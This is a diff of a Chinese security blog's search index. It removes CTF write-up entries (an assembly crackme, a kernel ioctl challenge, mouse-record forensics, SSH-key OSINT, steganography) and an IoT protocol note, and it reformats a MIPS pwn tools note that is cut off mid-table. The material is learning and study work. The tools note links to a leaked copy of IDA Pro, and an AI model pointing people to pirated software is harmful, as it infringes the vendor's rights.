@@ -1,351 +1,134 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ctf | cybricsctf2021复现</title>
-    <url>/2021/08/23/cybricsctf2021/</url>
-    <content><![CDATA[<blockquote>
-<p>逆向选了跟 Pwn 关系大点的两道来做，感觉还比较友好；杂项做的应该都是目前常见的类型，主要写写脚本熟悉一下。CTB 类型的题会单独放在另一篇。</p>
-</blockquote>
-<span id="more"></span>
-
-<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><blockquote>
-<p>逆向菜鸡来学逆向了</p>
-</blockquote>
-<h3 id="listing"><a href="#listing" class="headerlink" title="listing"></a>listing</h3><p>给的是汇编源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BITS 64</span><br><span class="line">global check</span><br><span class="line">section .text</span><br><span class="line">check:</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 0x100</span><br><span class="line">    VMOVDQA ymm0, [rdi]</span><br><span class="line">    and rsp, 0xffffffffffffff00</span><br><span class="line">    mov rax, 0xfeca50051345b0b0</span><br><span class="line">    push rax</span><br><span class="line">    push rax</span><br><span class="line">    push rax</span><br><span class="line">    push rax</span><br><span class="line">    VMOVDQA ymm1, [rsp]</span><br><span class="line">    VPXOR ymm2, ymm1, ymm0</span><br><span class="line">    mov rax, 0x0100030205040706</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0x09080b0a0c0d0f0e</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0x1110131215141716</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0x19181b1a1c1d1f1e</span><br><span class="line">    push rax</span><br><span class="line">    VMOVDQA ymm3, [rsp]</span><br><span class="line">    VPSHUFB ymm4, ymm2, ymm3</span><br><span class="line">    mov rax, 0xd1d3762335619aab</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0xd5d52327356583f8</span><br><span class="line">    push rax</span><br><span class="line">    mov rax, 0xc9d36127336c85b9</span><br><span class="line">    push rax</span><br><span class="line">    mov rax,0xd5d622713161cbf8 </span><br><span class="line">    push rax</span><br><span class="line">    VMOVDQA ymm0, [rsp]</span><br><span class="line">    VPCMPEQQ  ymm1, ymm4, ymm0</span><br><span class="line">    VMOVDQA [rsp], ymm1</span><br><span class="line">    pop rax</span><br><span class="line">    cmp rax, 0xffffffffffffffff</span><br><span class="line">    jnz fail</span><br><span class="line">    pop rax</span><br><span class="line">    cmp rax, 0xffffffffffffffff</span><br><span class="line">    jnz fail</span><br><span class="line">    pop rax</span><br><span class="line">    cmp rax, 0xffffffffffffffff</span><br><span class="line">    jnz fail</span><br><span class="line">    pop rax</span><br><span class="line">    cmp rax, 0xffffffffffffffff</span><br><span class="line">    jnz fail</span><br><span class="line">    mov rax, 1</span><br><span class="line">    jmp fin</span><br><span class="line">fail:</span><br><span class="line">    xor rax, rax</span><br><span class="line">fin:</span><br><span class="line">    mov rsp, rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
-
-
-
-<p>错误示范… 也许需要再加点内容才能完全 as 吧：</p>
-<img src="https://i.loli.net/2021/08/02/OlmTbLBQknwzYWV.png"  />
-
-
-
-<p>其实这个汇编也并不是很难懂，仔细看下来也就压了三个数进栈，分别用作：和 rdi input XOR、和 key VPSHUFB、和 dst CMP。关键就是这个 <code>VPSHUFB</code> 指令做了什么： <a href="http://www.baidu.com/link?url=WuCw-yhG9TBro8_gyRb_P0GS_XFzhHT2R8c0KzfFMT5YMdH4m2kSVBsDeTqgip_AEuxt_vvdlhYY6vQ-iob44q">SM4的快速软件实现技术</a>。结合下图理解起来更清晰了，感觉跟移位密码有共同之处。</p>
-<img src="https://i.loli.net/2021/08/02/pasE9Dz7t8LAiGy.png"  />
-
-
-
-<p>题目的key就是两两逆序，也就是说最后比对的 dst 数组原样应该是每两字节逆序。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0x0100030205040706</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x09080b0a0c0d0f0e</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x1110131215141716</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x19181b1a1c1d1f1e</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
-
-
-
-<p>最终得到： <code>cafedeadeeb0052&#125;cybrics&#123;fe414125</code>。</p>
-<script src="https://gist.github.com/7ee1n/58395b1611748a59d1051bea0878c8b8.js"></script>
-
-
-
-
-
-<h3 id="Kernel-Reverse"><a href="#Kernel-Reverse" class="headerlink" title="Kernel Reverse"></a>Kernel Reverse</h3><p>只给了ssh的用户名和密码，登上去找到文件路径后，先把文件下载下来：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp team181@104.248.38.201:/home/team181/ioctl.ko /home/ch331n/cs/ctf/xctf</span><br></pre></td></tr></table></figure>
-
-
-
-<p>ioctl的函数，控制设备输入输出操作的。没啥思路，从 init 函数一个个跟进，在 bss 中发现了 flag 变量，x 跟进到下面这个函数：参数 a2为 <code>0x5702 </code>，a3是当前时间异或 <code>0x13373389</code> ，就会有flag。但是 ida 显示这个函数没有被调用过… 有输入才有输出，flag是输出，按理来说 a2 和 a3 应该是可控的输入。而且正确来说 flag 并没有输出，它只是覆盖了 a3参数。</p>
-<img src="https://i.loli.net/2021/08/02/uIGrzSCXLqVo5xT.png"  />
-
-<p>用户态 ioctl 函数的调用如下。其中 fd 是打开设备时用 open 函数获得的 fd ，cmd 是用户输入的控制命令（可为多个）。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">int ioctl(int fd, int cmd, ...) ;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>a2 作为第一个 cmd，a3 作为第二个 amd，调用完 a3 后输出：</p>
-<script src="https://gist.github.com/7ee1n/7f208ed11c7c9050238cbd85b254a7a8.js"></script>
-
-
-
-<p>上传执行：</p>
-<img src="https://i.loli.net/2021/08/02/peNlth1wGKjsvDo.png"  />
-
-
-
-
-
-
-
-<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h3 id="recording"><a href="#recording" class="headerlink" title="recording"></a>recording</h3><p>给的是个mrf文件，到 fileinfo 上查就知道是什么文件了：<a href="https://fileinfo.com/extension/mrf">MRF File Extension</a> 。Mouse Record File，鼠标记录的文件，用 Macro Recorder 打开就能清楚地看到鼠标轨迹：打开了火狐浏览器。后面都是些移动、点击操作。用 Playback 可以重放轨迹，鼠标先移到左上角点击，之后都是移到中下方点击。因为这些都是在浏览器页面操作的，可以猜测是点击了搜索栏，再输入内容，也就是后续的鼠标事件都是在使用屏幕键盘。</p>
-<img src="https://i.loli.net/2021/08/02/2PH3s8pNeTrgqjc.png"  />
-
-
-
-<p>比赛时不知道怎么确定键盘的大小、位置，按理说都会给提示的，没找着。刚开始猜是  <code>http</code> 头，前两个字母位置确定了就ok，但鼠标点的前三个位置都不同，网址开头肯定不是 <code>http</code>。 大意了啊，window change 事件不止一个… 输入完网址后有个页面跳转，这里直接有网址 <code>Pastebin.com</code>。再路径重放一下前面的输入，找到真正的网址：<code>pastebin.com/uzqCjFUa</code>。</p>
-<img src="https://i.loli.net/2021/08/02/oNqS7xhW8sDdRce.png"  />
-
-
-
-<p>后续的点击位置都在键盘处，加上该网站要求输入密码，可以推测后面的操作都是在输密码：<code>9yDz5iZprd</code>。</p>
-<img src="https://i.loli.net/2021/08/02/6zrKvDHSFPi5RaN.png"  />
-
-
-
-<h3 id="nameCheck"><a href="#nameCheck" class="headerlink" title="nameCheck"></a>nameCheck</h3><p>给了些bash、ssh的key文件。关于 base64 能解 SSH key 我是没想到的。</p>
-<img src="https://i.loli.net/2021/08/02/I1iO3xNZo9C6Adp.png"  />
-
-
-
-<p>感觉就是社工题，拿到用户名后搜索一下，发现 ig 账号，进去看限时动态能发现飞机票上的二维码，进而知道真名信息。除了直接解 key外，W&amp;M 战队的方法我觉得学到了不少。既然给的都是 SSH 的文件，key都给了，可以直接拿它去登陆，获取用户名信息：</p>
-<img src="https://i.loli.net/2021/08/02/uAIvwjtCmzNJqpc.png"  />
-
-
-
-<p>关于SSH连接 Github 的用法以及用 keygen 生成自己的 key： <a href="https://docs.github.com/en/github/authenticating-to-github/connecting-to-github-with-ssh">Connecting to GitHub with SSH - GitHub Docs</a></p>
-<img src="https://i.loli.net/2021/08/02/YejROclH8UfdWaG.png"  />
-
-
-
-
-
-
-
-<h1 id="Rebyc"><a href="#Rebyc" class="headerlink" title="Rebyc"></a>Rebyc</h1><h3 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h3><p>前四关直接看，看不清的刷新下换个简单的图就好了。第五关是个二维码，关键是分片拼在一起。首先分帧：</p>
-<script src="https://gist.github.com/7ee1n/3ee90729eb8eb017c5bb48c6fd3dddbb.js"></script>
-
-
-
-<p>分完后有一百多张图片，肯定有重复的、重叠的。找到不重复的那几张拼接就可以。从第8张图开始，每隔三张出现一张完整的图，最后一张是第86张，拼接起来就有个二维码：</p>
-<script src="https://gist.github.com/7ee1n/41f489353b3a0f2a79f4d1b3dc9685f4.js"></script>
-
-
-
-<h3 id="captcha"><a href="#captcha" class="headerlink" title="captcha"></a>captcha</h3><p>主要是学会用 stegsolve，新手教程：<a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法- cat47 - 博客园</a>。（左右多调调就出了）</p>
-<img src="https://i.loli.net/2021/08/02/p2g68hVQLxRG9UK.png" style="zoom: 80%;" />
-
-<p>but前几天的 dasctf 赛中，有一两道题只用 stegsolve 是分析不完全的，还是写脚本遍历提取比较全面。</p>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>note | iot通用协议标准</title>
-    <url>/2021/07/29/iot-protocol-overview/</url>
-    <content><![CDATA[<blockquote>
-<p><a href="https://paper.seebug.org/1045/">Seebug入门级资料</a> 的note。简单来说攻击面可以分成设备本身、移动端、云端、通信过程四部分。以下是整理的通讯层面的内容，个人感觉重点是 协议的实现和数据格式。</p>
-</blockquote>
-<span id="more"></span>
-
-
-
-<h2 id="通讯层面-通用协议标准"><a href="#通讯层面-通用协议标准" class="headerlink" title="通讯层面-通用协议标准"></a>通讯层面-通用协议标准</h2><p>以下的这些协议都会涉及到应用层，有一部分还会规定传输层、数链层、物理层的标准。</p>
-<h3 id="CoAP"><a href="#CoAP" class="headerlink" title="CoAP"></a>CoAP</h3><p>iot设备的 RAM 和 ROM 一般很小，没有足够的空间支持 TCP 和 HTTP 协议，也就诞生了这个由 UDP 实现的低功耗短连接的协议。主要用于 M2M 的应用场景，也就是能联网的设备，像水表的自动抄表模块、手机的移动通信模块、工业的遥控模块等。（<a href="https://coap.technology/tools.html">工具</a>）</p>
-<h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><p>可以理解为简化的HTTP（text），分请求和响应报文，但 CoAP 是 binary 格式的。除去token、options、payload，最小的报文长度为 4 字节。各固定字段含义和内容详见 <a href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol">wiki</a>。其中Type大小为 2 bit，共四种类型：CON、NON、ACK、RST，前两种可类比为 TCP 和 UDP来理解。</p>
-<p><img src="https://i.loli.net/2021/07/29/7CYLxW9f2PnybED.png"></p>
-<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>默认端口为 udp 5683（coaps是5684）。</p>
-<h3 id="MQTT"><a href="#MQTT" class="headerlink" title="MQTT"></a>MQTT</h3><p>也是轻量级的通讯协议，但它基于的是 TCP/IP 协议。CoAP支持的是 Client 和 Server 间的一对一信息传递，MQTT支持多对多，应用场景更广，如卫星链路通信传感器、智能家居等。</p>
-<h4 id="报文类型和格式"><a href="#报文类型和格式" class="headerlink" title="报文类型和格式"></a>报文类型和格式</h4><p>主要分 Connect、Subscribe、Publish、Disconnect四种类型。客户端可以是发布者或订阅者，服务器端是代理者。下图以订阅过程为例，或者参考 <a href="https://en.wikipedia.org/wiki/MQTT">wiki</a> 上的智能空调温度调节实例，个人觉得那个更好理解。</p>
-<p><img src="https://i.loli.net/2021/07/29/WUKVcBXqdIaiuG9.png"></p>
-<p>报文的最小长度为 2 字节，payload最长为256字节。固定头部和可变长头部包括消息类型、长度等常见字段，详见 <a href="https://www.runoob.com/w3cnote/mqtt-intro.html">菜鸟教程</a> 。</p>
-<h3 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h3><p>跟MQTT一样都是队列协议，都使用异步通信机制。可以将 MQTT 理解为 AMQP 的简化版，它们的实现原理相同，但 MQTT 是专门为计算性能不高的小设备设计的。两者主要区别如下表，详见：<a href="https://www.cnblogs.com/bclshuai/p/8607517.html">RabbitMQ MQTT协议和AMQP协议</a> 。</p>
-<table>
-<thead>
-<tr>
-<th>AMQP</th>
-<th>MQTT</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>底层消息传递协议</td>
-<td>消息通讯机制</td>
-</tr>
-<tr>
-<td>面向缓存</td>
-<td>面向流，内存占用低</td>
-</tr>
-<tr>
-<td>支持长周期消息传递</td>
-<td>短周期，不支持长周期存储和转发</td>
-</tr>
-<tr>
-<td>用SASL和TLS确保安全性</td>
-<td>简单用户名和密码</td>
-</tr>
-<tr>
-<td>Client和Server对等</td>
-<td>Client和Server不对等</td>
-</tr>
-<tr>
-<td>可扩展</td>
-<td>不可扩展</td>
-</tr>
-</tbody></table>
-<h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>算是这么多协议中我最熟悉的一个了，计网必学hh。</p>
-<p>也是基于 TCP 协议，通过 HTTP 的 80 和 443 端口工作，使用HTTP Upgrade 头。<a href="https://zh.wikipedia.org/wiki/WebSocket">wiki</a> 上给出的交握请求数据如下：</p>
-<p><img src="https://i.loli.net/2021/07/29/gXQcUixtWpPMuzN.jpg"></p>
-<p>其中 Upgrade 和 Connection 是固定的。Sec-WebSocket-Key 是 Base64 编码的字串，加上特殊字串计算出 SHA-1 摘要，得到 Sec-WebSocket-Accept。</p>
-<p>编程跟socket编程差不多，参考 <a href="https://www.ruanyifeng.com/blog/2017/05/websocket.html">WebSocket教程</a> 。</p>
-<h3 id="CANbus"><a href="#CANbus" class="headerlink" title="CANbus"></a>CANbus</h3><p>多主机串行标准，为实时要求而设计，在微控制器之间提供快速通信，取替了成本更高的RAM技术。主要用于实时性要求高的嵌入式系统，如汽车、工业自动化、医疗工程等。更具体的可以看 <a href="https://copperhilltech.com/a-brief-introduction-to-controller-area-network/">A Brief Introduction to Controller Area Network</a> 。</p>
-<h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>需要高低电平两条电线：CAN_H 和 CAN_L，组成一条双绞线。</p>
-<p>具体看 <a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%99%A8%E5%8D%80%E5%9F%9F%E7%B6%B2%E8%B7%AF">wiki</a> ，感觉跟通信原理和计组很像，主要是底层的一些编码跟电路的关系。</p>
-<h3 id="Modbus"><a href="#Modbus" class="headerlink" title="Modbus"></a>Modbus</h3><p>多对多的请求应答协议，用于控制器和设备通信，主要是规定了数据传输的模式、格式，带有检错功能。</p>
-<p><img src="https://i.loli.net/2021/07/29/UlJMchOd6oWTu2X.png"></p>
-<p>校验过程：<a href="https://www.cnblogs.com/luomingui/archive/2013/06/14/Modbus.html">Modbus通讯协议学习</a> 。</p>
-<h3 id="Profibus"><a href="#Profibus" class="headerlink" title="Profibus"></a>Profibus</h3><p>前面的Modbus是施耐德电气公司发明的。Profibus则是西门子公司发明的，实时性高，用于智能设备、自动化系统间的点对点通信。更详细的物理层上的结构可以看 ：<a href="https://www.smar.com/en/profibus">What is PROFIBUS? | SMAR Technology Company</a></p>
-<h3 id="DNP3"><a href="#DNP3" class="headerlink" title="DNP3"></a>DNP3</h3><p>分布式网络协议，比 Modbus 更复杂、更高效。为用户数据提供复用、数据分片、错误检查、链路控制、优先级和数链层寻址服务，定义了传输功能，使用大量的 CRC 校验来检错。</p>
-<p>详见：<a href="https://www.baidu.com/link?url=qyBX843MWBacsfH3OYZJWY1rGTpNQ6y8ky4u5mJZPoEWKJ7kuJz8S8iIxgEvKrs3Ca_S0BiUBnmHZ2fm59kpkmPj209hGWoVVTUdgsQynkm&wd=&eqid=ed625bb10004b3c4000000066102a283"><em>DNP3</em>协议简单介绍及协议识别方法 – 灯塔实验室</a> 。</p>
-<p>通信端口：TCP的20000端口。</p>
-<h3 id="BACNet"><a href="#BACNet" class="headerlink" title="BACNet"></a>BACNet</h3><p>building 指的是楼宇，该协议主要用于供暖、空调控制、火灾探测系统等。其协议栈参考：<a href="https://www.baidu.com/link?url=5y4I_zGBeOL0nABYYYxhgqNAYlVEq7vomABrZOIC3XeSg14wp67YQLAoYtl0Ti3grrkhIxSxOigBoz6r1VEBBK&wd=&eqid=e1a7b19b0005878c000000066102a515">认识<em>BACnet</em>协议 - 薄心之心 - 博客园</a>  。</p>
-<h3 id="HL7"><a href="#HL7" class="headerlink" title="HL7"></a>HL7</h3><p>数据格式看 <a href="https://en.wikipedia.org/wiki/Health_Level_7">wiki</a> 的就够了。</p>
-<h3 id="XMPP"><a href="#XMPP" class="headerlink" title="XMPP"></a>XMPP</h3><p>基于 XML 类型，为即时消息、在线状态信息而设计，实时性高。</p>
-<p>代码详见： <a href="https://www.baidu.com/link?url=453myG0wWyxJb9mqQQToft8yQEwiJY833aG0mGl5amYOcWRdd5mqDPx8IS7WUsJd&wd=&eqid=a6818c300003e1ce000000066102a6a6"><em>XMPP</em>详解 - 简书</a> 。</p>
-<h3 id="UPnP"><a href="#UPnP" class="headerlink" title="UPnP"></a>UPnP</h3><p>即插即用协议，我一开始不是很理解这个 “插” 字。顾名思义，Plug 🔌，就是插上🔌后联网设备能立即连网，也就是建立功能性网络服务。因此它会使用 HTTP 协议进行设备搜索请求（UDP 1900端口）、数据传输。有的设备还能通过网络访问，实际上是 UPnP 在刚开始查找到设备后，有可能为其增加一个外部 IP 地址，修改路由器的内容，增加新的端口转发映射，使得打印机、相机等设备能通过网络访问。</p>
-]]></content>
-      <tags>
-        <tag>iot</tag>
-        <tag>note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Note | MIPS工具&amp;&amp;入门题汇总</title>
     <url>/2021/08/23/mips-tools-and-ezpwn/</url>
     <content><![CDATA[<blockquote>
 <p>主要是汇编和调试方法要弄懂，做完这几个题应该也算入门了。感觉目前 ctf 中异构的 pwn 题以 arm 架构为主，mips 架构的比较少见，找到的题基本都是 hws 出的。题目囤了快半年，终于被我 pick 起来了😢 。之前卡住的原因主要出在工具上，前前后后踩了不少小白才会踩的坑，在复现前必须记录一下。</p>
 </blockquote>
 <span id="more"></span>
-
-
-
-<h1 id="1-tools"><a href="#1-tools" class="headerlink" title="1. tools"></a>1. tools</h1><p>分运行环境和逆向工具两部分。Buildroot 和 gdb-multiarch，应该有手就行。这里记录的都是我出过问题的工具。</p>
-<h2 id="MIPS运行环境"><a href="#MIPS运行环境" class="headerlink" title="MIPS运行环境"></a>MIPS运行环境</h2><p>虚拟机是 x86 的平台，要运行 MIPS 指令集的程序就需要模拟运行环境。可以理解为虚拟机中的虚拟机 (?   原理是 Linux 的虚拟化技术： <a href="https://www.redhat.com/zh/topics/virtualization/what-is-KVM">KVM是什么？一文带你快速了解Linux KVM 虚拟化 - Red Hat</a></p>
-<p>目前用的最多的虚拟器就是 QEMU 吧。它工作的原理也好理解，就是仿真，通过动态的二进制转换在 x86 架构的系统上执行其他架构的程序。说到这不得不提，这个二进制转换并不只能是复杂指令集向精简指令集的转换的，反之也行。具体例子：<a href="https://www.bilibili.com/video/BV1MU4y137Yi?from=search&seid=13839685224042904734">给手机装Windows11！还能玩大型游戏？！_哔哩哔哩_bilibili</a> 。</p>
+<h1>1. tools</h1>
+<p>分运行环境和逆向工具两部分。Buildroot 和 gdb-multiarch，应该有手就行。这里记录的都是我出过问题的工具。</p>
+<h2 id="MIPS运行环境"><a class="header-anchor" href="#MIPS运行环境">¶</a>MIPS运行环境</h2>
+<p>虚拟机是 x86 的平台，要运行 MIPS 指令集的程序就需要模拟运行环境。可以理解为虚拟机中的虚拟机 (?   原理是 Linux 的虚拟化技术： <a href="https://www.redhat.com/zh/topics/virtualization/what-is-KVM">KVM是什么？一文带你快速了解Linux KVM 虚拟化 - Red Hat</a></p>
+<p>目前用的最多的虚拟器就是 QEMU 吧。它工作的原理也好理解，就是仿真，通过动态的二进制转换在 x86 架构的系统上执行其他架构的程序。说到这不得不提，这个二进制转换并不只能是复杂指令集向精简指令集的转换的，反之也行。具体例子：<a href="https://www.bilibili.com/video/BV1MU4y137Yi?from=search&amp;seid=13839685224042904734">给手机装Windows11！还能玩大型游戏？！_哔哩哔哩_bilibili</a> 。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure>
-
-
-
 <p>QEMU 有多个模式，最常见的是 qemu-user 和 qemu-system。顾名思义，qemu-user 是用户模式，用户一般只需运行程序，不需要接触到系统层面的配置。安装好后能在 <code>/usr/bin/</code> 下找到不同架构的模拟运行程序，图中的这些都是 qemu-user ，用它可以在 x86 平台上直接运行对应架构的程序。“直接运行”，也就是实现了交叉编译和交叉侦错。qemu 的这些模拟器跟 <code>arm-linux-gnueabihf</code> 、<code>aarch64-linux-gnu</code> 这些交叉编译器相似，而且安装完后它们都是在 <code>/usr</code> 下的。</p>
 <img src="https://i.loli.net/2021/07/30/jUXvaNlz5WQm4TM.png"  />
-
-
-
 <p>而 qemu-system 就是系统模式。模拟一个系统的运行包括镜像选择、网卡配置等用户模式设置不了的内容，它的运行相对也就多步骤些。需要目标架构的内核，模拟出目标系统后有用户名、密码，将程序上传到该系统执行、侦错就需要它能与 Linux 系统通信（也就是配置网卡、联网）… 这种情况下，异构的程序并非直接在 x86 上运行，而是在异构系统上运行，直接在 x86 上运行的是异构系统。</p>
 <img src="https://i.loli.net/2021/07/30/SYkCmUgsW3cKHVL.png"  />
-
-
-
 <p>讲了这么多理解的部分，是因为我觉着先理解后使用挺重要的。刚学的时候直接复制粘贴就用，不清楚工具的本质，也分不清它们的区别。（以至于国赛的时候给了个名字陌生的 qemu-user 就不会用了emmm）轩哥的文章给了很多链接，也写的很详细，看完应该差不多了：<a href="https://xuanxuanblingbling.github.io/ctf/tools/2020/04/16/qemu/">QEMU使用记录  Clang裁缝店</a> 。</p>
-<h2 id="MIPSROP"><a href="#MIPSROP" class="headerlink" title="MIPSROP"></a>MIPSROP</h2><p>用的是支持 MIPS 反汇编的 IDA Pro 7.5，下载链接： <a href="https://github.com/VanHoevenTR/IDA_Pro_7.5">VanHoevenTR/IDA_Pro_7.5: IDA Pro 7.5 leak</a> 。</p>
+<h2 id="MIPSROP"><a class="header-anchor" href="#MIPSROP">¶</a>MIPSROP</h2>
+<p>用的是支持 MIPS 反汇编的 IDA Pro 7.5，下载链接： <a href="https://github.com/VanHoevenTR/IDA_Pro_7.5">VanHoevenTR/IDA_Pro_7.5: IDA Pro 7.5 leak</a> 。</p>
 <p>直接解析二进制文件的时候会报错：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...\ida\plugins\idapython3_64.dll) error: 找不到指定的模块</span><br></pre></td></tr></table></figure>
-
 <p>原因是 python 的版本不正确。此时我的是 3.8 版本的，查了下，需要的是 3.9 的。（安装 3.9 的时候可以顺便勾选自动添加 PATH 的选项，之后用 pip 安装的时候就不用再配置或者找到 python  的目录了。）</p>
 <p>前面的链接里有个工具包 <code>ida75sp3_python39_win.zip</code>，用于配置 3.9 的环境。解压到 ida 根目录，全部覆盖，再运行 <code>idapyswitch.exe</code> 就可以了。不是 Windows 的可以下载对应版本：<a href="https://hex-rays.com/blog/python-3-9-support-for-ida-7-5/">Python 3.9 support for IDA 7.5 – Hex Rays</a> 。</p>
-<p><img src="https://i.loli.net/2021/07/30/LFHVbET9z3kpqsu.png"></p>
-<p>之后运行报 <code>cannot import name &#39;ida_shims&#39; from &#39;shims&#39;</code> 的错，就是少了 shims 这个模块的意思。把 <a href="https://github.com/tacnetsol/ida/tree/master/plugins"><br>ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放进 plugins 目录下，或者用 install.py 把插件全下完也可以。到这一步基本上没什么报错了，也能进行 MIPS 的反汇编。除了这个 PowerPC Big Endian 的固件反汇编不出来： <a href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍</a> 。正常来说下面这种 MIPS 的elf 是没问题的，so 这个 PowerPC Big Endian 的我决定复现完再去整。</p>
+<p><img src="https://i.loli.net/2021/07/30/LFHVbET9z3kpqsu.png" alt=""></p>
+<p>之后运行报 <code>cannot import name 'ida_shims' from 'shims'</code> 的错，就是少了 shims 这个模块的意思。把 <a href="https://github.com/tacnetsol/ida/tree/master/plugins"><br>
+ida/<strong>plugins</strong> at master · tacnetsol/ida</a> 的 shims 插件放进 plugins 目录下，或者用 <a href="http://install.py">install.py</a> 把插件全下完也可以。到这一步基本上没什么报错了，也能进行 MIPS 的反汇编。除了这个 PowerPC Big Endian 的固件反汇编不出来： <a href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍</a> 。正常来说下面这种 MIPS 的elf 是没问题的，so 这个 PowerPC Big Endian 的我决定复现完再去整。</p>
 <img src="https://i.loli.net/2021/07/30/27MrjAc9yzFpaJq.png"  />
-
-
-
 <p>前面的插件已经包括 mipsrop 。如果装好了的话能在 <code>Edit -&gt; Plugins</code> 中看到。每次使用前需点击 <code>Search -&gt; mips rop gadgets </code>激活这个插件，idaPython 中 看到 <code>MIPS ROP Finder activated</code>就是可用状态了。使用命令可以输入 <code>mipsrop.help()</code>查看。</p>
 <img src="https://i.loli.net/2021/07/30/IrMSEBxcj8O5A4f.png"  />
-
-
-
-
-
-<h1 id="2-题目"><a href="#2-题目" class="headerlink" title="2. 题目"></a>2. 题目</h1><p>题目来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a> 、<a href="https://ctf.show/challenges%E3%80%82">https://ctf.show/challenges。</a></p>
-<h2 id="2-1-缓冲区溢出"><a href="#2-1-缓冲区溢出" class="headerlink" title="2.1 缓冲区溢出"></a>2.1 缓冲区溢出</h2><blockquote>
+<h1>2. 题目</h1>
+<p>题目来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a> 、<a href="https://ctf.show/challenges%E3%80%82">https://ctf.show/challenges。</a></p>
+<h2 id="2-1-缓冲区溢出"><a class="header-anchor" href="#2-1-缓冲区溢出">¶</a>2.1 缓冲区溢出</h2>
+<blockquote>
 <p>重点关注 MIPS32 与 X86 架构下 函数调用与栈的不同之处。</p>
 </blockquote>
 <p>32个通用寄存器表：</p>
 <table>
 <thead>
 <tr>
-<th align="center">编号</th>
-<th align="center">寄存器名称</th>
-<th align="center">寄存器描述</th>
+<th style="text-align:center">编号</th>
+<th style="text-align:center">寄存器名称</th>
+<th style="text-align:center">寄存器描述</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">$0</td>
-<td align="center">$zero</td>
-<td align="center">始终为0，用于辅助运算判断、创建伪指令等</td>
+<tbody>
+<tr>
+<td style="text-align:center">$0</td>
+<td style="text-align:center">$zero</td>
+<td style="text-align:center">始终为0，用于辅助运算判断、创建伪指令等</td>
 </tr>
 <tr>
-<td align="center">$1</td>
-<td align="center">$at</td>
-<td align="center">保留寄存器，用作汇编器的暂时变量</td>
+<td style="text-align:center">$1</td>
+<td style="text-align:center">$at</td>
+<td style="text-align:center">保留寄存器，用作汇编器的暂时变量</td>
 </tr>
 <tr>
-<td align="center">$2、$3</td>
-<td align="center">$v0、$v1</td>
-<td align="center">values，子程序返回值/非浮点结果（不够用时用内存）</td>
+<td style="text-align:center">$2、$3</td>
+<td style="text-align:center">$v0、$v1</td>
+<td style="text-align:center">values，子程序返回值/非浮点结果（不够用时用内存）</td>
 </tr>
 <tr>
-<td align="center">$4/5/6/7</td>
-<td align="center">$a0/1/2/3</td>
-<td align="center">aruments，函数的前四个参数（不够时用堆栈处理）</td>
+<td style="text-align:center">$4/5/6/7</td>
+<td style="text-align:center">$a0/1/2/3</td>
+<td style="text-align:center">aruments，函数的前四个参数（不够时用堆栈处理）</td>
 </tr>
 <tr>
-<td align="center">$8~$15</td>
-<td align="center">$t0/1/…/7</td>
-<td align="center">temporaries，计算时用的临时寄存器</td>
+<td style="text-align:center">$8~$15</td>
+<td style="text-align:center">$t0/1/…/7</td>
+<td style="text-align:center">temporaries，计算时用的临时寄存器</td>
 </tr>
 <tr>
-<td align="center">$16~$23</td>
-<td align="center">$s0/1/…/7</td>
-<td align="center">saved values，保留现场</td>
+<td style="text-align:center">$16~$23</td>
+<td style="text-align:center">$s0/1/…/7</td>
+<td style="text-align:center">saved values，保留现场</td>
 </tr>
 <tr>
-<td align="center">$24、$25</td>
-<td align="center">$t8、$t9</td>
-<td align="center">temporaries，补充前面的 $t0 ~ $t7</td>
+<td style="text-align:center">$24、$25</td>
+<td style="text-align:center">$t8、$t9</td>
+<td style="text-align:center">temporaries，补充前面的 $t0 ~ $t7</td>
 </tr>
 <tr>
-<td align="center">$26、$27</td>
-<td align="center">$k0、$k1</td>
-<td align="center">中断处理函数用于保存系统参数</td>
+<td style="text-align:center">$26、$27</td>
+<td style="text-align:center">$k0、$k1</td>
